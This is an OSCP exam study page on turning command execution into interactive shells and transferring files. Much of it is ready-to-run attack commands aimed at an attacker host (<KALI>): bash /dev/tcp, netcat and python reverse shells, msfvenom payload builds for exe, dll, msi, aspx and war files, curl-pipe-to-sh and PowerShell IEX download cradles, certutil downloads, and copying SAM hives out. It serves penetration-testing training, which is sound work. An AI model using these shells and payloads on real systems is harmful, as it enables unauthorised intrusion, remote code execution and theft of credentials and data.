---
title: Shells & File Transfer
tags:
  - oscp
---

# Shells & File Transfer { #shells-file-transfer }

<div class="dfir-meta" markdown>
**Applies to:** every foothold · **Priority:** High · **Last updated:** 2026-11-03
</div>

!!! abstract "In one sentence"
    Turn "I can run a command" into a stable, interactive shell you can screenshot, and move your tools onto the target — with payloads you build yourself (`msfvenom` is always allowed) and Metasploit kept for at most one machine.

!!! tip "Practical companion"
    For command selection, output interpretation and failure diagnosis, use the [practical field guide](practical-guide.md#shell); for Windows/AD protocol detail, use the [Impacket handbook](impacket.md).

## 1. Concept { #concept }

Three separate problems, solved in order:

1. **Get a callback** — a reverse shell from the target to a listener on Kali (or a bind shell if egress is blocked).
2. **Stabilise it** — a real TTY on Linux, history/arrow keys on Windows, so you don't lose the shell to `Ctrl-C`.
3. **Move files** — upload enumeration scripts and exploits, download loot.

!!! danger "Exam rule — Metasploit on one target only"
    - Metasploit modules (exploit / auxiliary / post) **or** Meterpreter: **one** target of your choice. Once used on a machine, the choice is locked — even if it fails.
    - Running `check` against several hosts to pick one counts as using it on all of them.
    - No Metasploit pivoting (`autoroute`, `portfwd`, socks module).
    - **Always allowed on every target:** `msfvenom` (any payload format) and `exploit/multi/handler` **with a non-Meterpreter payload** (e.g. `windows/x64/shell_reverse_tcp`).
    - Full wording → [Exam format › Metasploit](exam-format.md#metasploit).

## 2. Main tools { #tools }

| Tool | Use it for | Exam status |
|---|---|---|
| **nc / ncat + rlwrap** | Listeners, simple transfers | Allowed |
| **msfvenom** | Reverse-shell payloads: exe, elf, dll, msi, aspx, war, php, raw shellcode | Allowed everywhere |
| **multi/handler** | Catching staged / non-Meterpreter payloads | Allowed with non-Meterpreter payloads |
| **python3 -m http.server** | Serving files from Kali | Allowed |
| **impacket-smbserver** | SMB share on Kali (copy, run from UNC, hash capture) | Allowed |
| **certutil / iwr / curl / wget** | Download on target ([LOLBAS](https://lolbas-project.github.io/) / [GTFOBins](https://gtfobins.github.io/)) | Allowed |
| **evil-winrm** | Built-in `upload` / `download` over WinRM | Allowed |

## 3. Scenarios { #scenarios }

### 3.1 Listener and one-liners { #reverse-shells }

**Situation:** You have command execution (web shell, command injection, exploit) and want a shell.

```bash
# Kali — listener on a port egress rules usually allow
rlwrap -cAr nc -lvnp 443
```

=== "Linux target"

    ```bash
    bash -c 'bash -i >& /dev/tcp/<KALI>/443 0>&1'
    # no bash /dev/tcp?
    rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <KALI> 443 > /tmp/f
    busybox nc <KALI> 443 -e /bin/sh
    python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<KALI>",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
    ```

=== "Windows target"

    ```powershell
    # upload nc.exe first (see 3.5), then:
    C:\Windows\Temp\nc.exe <KALI> 443 -e cmd.exe
    # or a msfvenom exe (3.2)
    C:\Windows\Temp\rev.exe
    ```

**What to read:** `connect to [KALI] from (UNKNOWN) [IP]` → you're in. Nothing arrives? → try port 80 / 53, check that the target can reach you at all (`ping`, `curl http://<KALI>/`), or try a bind shell.

!!! tip "Payloads inside a URL or JSON"
    Base64 the payload to avoid quoting issues: `echo 'bash -i >& /dev/tcp/<KALI>/443 0>&1' | base64` → `echo <b64> | base64 -d | bash`. On Windows: `powershell -enc <UTF-16LE base64>`.

### 3.2 msfvenom — build the payload you need { #msfvenom }

**Situation:** An exploit needs shellcode, a service needs a replacement binary, a Tomcat manager accepts a WAR, an upload accepts ASPX.

```bash
# Windows exe / service binary
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f exe -o rev.exe
# Windows DLL (DLL hijack)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f dll -o evil.dll
# MSI (AlwaysInstallElevated)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f msi -o evil.msi
# ASPX (IIS upload)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f aspx -o rev.aspx
# WAR (Tomcat manager)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$KALI LPORT=443 -f war -o rev.war
# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f elf -o rev.elf
# Shellcode for a public exploit (Python format, strip bad chars)
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=443 EXITFUNC=thread -b '\x00' -f python -v shellcode
```

**Stageless vs staged:** `shell_reverse_tcp` (underscore) is **stageless** → catch with plain `nc`. `shell/reverse_tcp` (slash) is **staged** → needs `multi/handler`:

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell/reverse_tcp; set LHOST tun0; set LPORT 443; run"
```

**Next:** match the architecture (`x64` vs `x86` — check `systeminfo` / `uname -m`); a wrong arch just dies silently.

### 3.3 Linux — upgrade to a full TTY { #tty-upgrade }

**Situation:** A raw `nc` shell: no tab completion, `sudo` / `su` complain about a terminal, `Ctrl-C` kills it.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'    # or: script -qc /bin/bash /dev/null
# press Ctrl-Z
stty raw -echo; fg
# press Enter, then:
export TERM=xterm-256color SHELL=/bin/bash
stty rows 50 cols 200          # match `stty size` on Kali
```

**What to read:** the prompt redraws properly, `su` prompts for a password, `vi` works. **Next:** [Linux privesc](privesc-linux.md).

!!! tip "Got SSH credentials or a key?"
    Use real SSH instead — it's the most stable shell, and `ssh -L/-R/-D` gives you pivoting for free → [Pivoting › SSH](pivoting.md#ssh-forwarding). For a found key: `chmod 600 id_rsa; ssh -i id_rsa user@$IP`.

### 3.4 Windows — usable shell { #windows-shell }

- Always listen with `rlwrap` (history + arrow keys).
- `powershell -ep bypass` from `cmd` to get PowerShell.
- With creds and 5985 open, **evil-winrm** is the best shell → [AD › evil-winrm](active-directory.md#evil-winrm).
- With RDP rights: `xfreerdp3 /v:$IP /u:user /p:'Pass' /dynamic-resolution /drive:share,/home/kali/exam/tools` (or `xfreerdp` on older Kali) — the `/drive` option mounts a Kali folder for file transfer.

### 3.5 File transfer — Kali → target { #upload }

```bash
# Kali: serve the tools folder
cd ~/exam/tools && python3 -m http.server 80
```

=== "Linux target"

    ```bash
    wget http://<KALI>/linpeas.sh -O /tmp/lp.sh
    curl http://<KALI>/linpeas.sh -o /tmp/lp.sh
    curl http://<KALI>/linpeas.sh | sh                    # run without touching disk
    # no wget/curl:
    exec 3<>/dev/tcp/<KALI>/80; echo -e "GET /pspy64 HTTP/1.0\r\n\r\n" >&3; cat <&3 > /tmp/pspy   # (strip headers after)
    ```

=== "Windows target"

    ```powershell
    iwr http://<KALI>/winPEASx64.exe -OutFile C:\Windows\Temp\wp.exe
    certutil -urlcache -split -f http://<KALI>/nc.exe C:\Windows\Temp\nc.exe
    IEX (New-Object Net.WebClient).DownloadString('http://<KALI>/PowerView.ps1')   # in-memory
    ```

**SMB instead of HTTP** (works when only 445 egress is allowed, and lets you run directly from the share):

```bash
impacket-smbserver share ~/exam/tools -smb2support -username k -password k
```

```powershell
net use \\<KALI>\share /user:k k
copy \\<KALI>\share\mimikatz.exe C:\Windows\Temp\
\\<KALI>\share\winPEASx64.exe
```

Write to a directory you can write to: `C:\Windows\Temp`, `C:\Users\Public`, `/tmp`, `/dev/shm`.

### 3.6 File transfer — target → Kali (loot) { #download }

```bash
# Kali: receive with nc
nc -lvnp 9001 > loot/backup.zip
```

```bash
# Linux target
nc <KALI> 9001 < /var/backups/backup.zip
```

```powershell
# Windows target → SMB share (above)
copy C:\Windows\Temp\sam.save \\<KALI>\share\
# evil-winrm session
download C:\Windows\Temp\sam.save
```

Verify integrity with `md5sum` / `Get-FileHash` on both ends for anything important (KeePass, registry hives).

!!! warning "Exam rule — don't exfiltrate for fun"
    Only download files you need to compromise a target, and delete them afterwards ([Other rules](exam-format.md#other-rules)).

## 4. Common mistakes { #mistakes }

- **Wrong architecture or staged payload with `nc`.** Staged (`/`) payloads need `multi/handler`.
- **Using Meterpreter "just to stabilise"** — that spends your one Metasploit target.
- **Listener on a high port** that egress blocks; use 443 / 80 first.
- **Writing to a directory you can't write to** (`C:\` root, `/root`), then wondering why the download "worked" but nothing runs.
- **Forgetting `-smb2support`** on `impacket-smbserver` — modern Windows refuses SMB1.
- **Losing the shell before the screenshot.** Take the flag screenshot as soon as you have the interactive shell.

## 5. Exam tips { #exam-tips }

- Keep a `tools/` folder with Windows (x64 and x86) and Linux binaries ready before the exam starts; test each one in a lab.
- A second, backup shell (a second listener, or a scheduled re-run) saves you when the first one dies mid-privesc.
- Note every payload command you used — `msfvenom` lines go in the report.

## Related pages

- [Exam workflow](exam-workflow.md) · [Web & initial access](web-initial-access.md) · [Pivoting](pivoting.md)
- [Linux privesc](privesc-linux.md) · [Windows privesc](privesc-windows.md)
- Defender view: [PowerShell cradles](../../adversary/powershell-cradles.md) · [LOLBins](../../adversary/lolbins.md) · [Beaconing / C2](../../network/beaconing-c2.md) · [Red Team: Execution tools](../../redteam/post-exploitation/execution-tools.md)

## References

- [revshells.com](https://www.revshells.com/)
- [GTFOBins](https://gtfobins.github.io/) · [LOLBAS](https://lolbas-project.github.io/)
